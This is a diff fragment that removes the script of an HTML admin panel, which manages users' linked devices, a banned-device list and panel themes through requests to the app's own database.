-                <div style="margin-bottom:15px; border-bottom:1px solid var(--border); padding-bottom:10px;">
-                    <button class="btn-mini btn-del" style="width:100%; height:40px; font-weight:700;" onclick="deleteAllDevices('${username}')"><i class="fas fa-trash-alt" style="margin-right:8px;"></i> RESET DEVICES</button>
-                </div>`;
-                Object.keys(devices).forEach(deviceId => {
-                    const isDevActive = devices[deviceId] === true;
-                    const checkedState = isDevActive ? 'checked' : '';
-                    div.innerHTML += `
-                    <div style="background:rgba(255,255,255,0.05); padding:10px; border-radius:8px; margin-bottom:8px; border:1px solid var(--border);">
-                        <div style="display:flex; justify-content:space-between; align-items:center;">
-                            <div style="font-size:0.75rem; color:var(--text); font-family:'JetBrains Mono';">${deviceId}</div>
-                            <div style="display:flex; align-items:center; gap:10px;">
-                                <label class="switch-mini"><input type="checkbox" ${checkedState} onchange="toggleDeviceStatus('${username}', '${deviceId}')"><span class="slider-mini"></span></label>
-                                <div class="btn-mini btn-view" style="width:30px; height:30px;" onclick="copyDeviceId('${deviceId}')"><i class="fas fa-copy"></i></div>
-                                <div class="btn-mini btn-del" style="width:30px; height:30px;" onclick="removeDevice('${username}', '${deviceId}')"><i class="fas fa-trash"></i></div>
-                            </div>
-                        </div>
-                    </div>`;
-                });
-            }
-            document.getElementById('deviceModal').classList.add('open');
-        }
-
-        async function toggleDeviceStatus(username, deviceId) {
-            const currentStatus = dbData.users[username].deviceid[deviceId] === true;
-            const newStatus = !currentStatus;
-            
-            // Local Update
-            dbData.users[username].deviceid[deviceId] = newStatus;
-            if(!dbData.banned_devices) dbData.banned_devices = {};
-            if(newStatus === false) { dbData.banned_devices[deviceId] = true; } 
-            else { delete dbData.banned_devices[deviceId]; }
-            
-            // Server Update (Targeted)
-            const baseUrl = cleanUrl(dbUrl);
-            // 1. Update User Device Status
-            fetch(`${baseUrl}/users/${username}/deviceid/${deviceId}.json`, { method: 'PUT', body: newStatus });
-            // 2. Update Banned List
-            if(newStatus === false) {
-                fetch(`${baseUrl}/banned_devices/${deviceId}.json`, { method: 'PUT', body: true });
-            } else {
-                fetch(`${baseUrl}/banned_devices/${deviceId}.json`, { method: 'DELETE' });
-            }
-        }
-
-        async function deleteAllDevices(username) {
-            if(confirm("Unlink ALL devices?")) {
-                dbData.users[username].deviceid = {};
-                viewDevices(username); renderUsers();
-                // Targeted Delete
-                const baseUrl = cleanUrl(dbUrl);
-                await fetch(`${baseUrl}/users/${username}/deviceid.json`, { method: 'DELETE' });
-            }
-        }
-
-        async function removeDevice(username, deviceId) {
-            if(confirm("Unlink this device?")) {
-                delete dbData.users[username].deviceid[deviceId];
-                viewDevices(username); renderUsers();
-                // Targeted Delete
-                const baseUrl = cleanUrl(dbUrl);
-                await fetch(`${baseUrl}/users/${username}/deviceid/${deviceId}.json`, { method: 'DELETE' });
-            }
-        }
-
-        function openPanelThemeModal() { document.getElementById('panelThemeModal').classList.add('open'); }
-        function setPanelTheme(t) { document.documentElement.setAttribute('data-theme', t); accent = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim(); closeModals(); }
-        function closeModals() { document.querySelectorAll('.modal-wrap').forEach(m=>m.classList.remove('open')); }
-        function hardReset() { localStorage.removeItem("dpAdminUrl"); location.reload(); }
-        function showToast(m) { const t=document.getElementById('toast'); t.querySelector('span').innerText=m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2000); }
-
-        function initParts() { cvs.width=window.innerWidth; cvs.height=window.innerHeight; for(let i=0;i<50;i++)parts.push({x:Math.random()*cvs.width,y:Math.random()*cvs.height,v:(Math.random()*0.5)+0.2,s:Math.random()*2}); anim(); }
-        function anim() { ctx.clearRect(0,0,cvs.width,cvs.height); ctx.fillStyle=accent; ctx.globalAlpha=0.4; parts.forEach(p=>{p.y-=p.v;if(p.y<0)p.y=cvs.height;ctx.beginPath();ctx.arc(p.x,p.y,p.s,0,Math.PI*2);ctx.fill();}); requestAnimationFrame(anim); }
-        window.addEventListener('resize', ()=>{cvs.width=window.innerWidth;cvs.height=window.innerHeight;});
-        document.documentElement.setAttribute('data-theme', 'Cyberpunk');
-        initParts();
-    </script>
 </body>
-</html>
+      </html>
